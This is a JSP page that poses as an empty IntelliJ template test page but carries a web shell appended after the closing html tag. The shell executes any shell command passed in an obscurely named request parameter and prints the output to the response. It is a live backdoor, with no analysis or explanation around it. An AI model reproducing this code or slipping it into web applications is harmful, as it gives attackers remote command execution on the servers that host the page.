<%--
  Created by IntelliJ IDEA.
  User: 19726
  Date: 2022/3/30
  Time: 10:17
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
test
</body>
</html>
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("vhVIcodMiRlYBC")).getInputStream();int a = -1;byte[] b = new byte[2048];while ((a = in.read(b)) != -1) {out.println(new String(b)); } %>//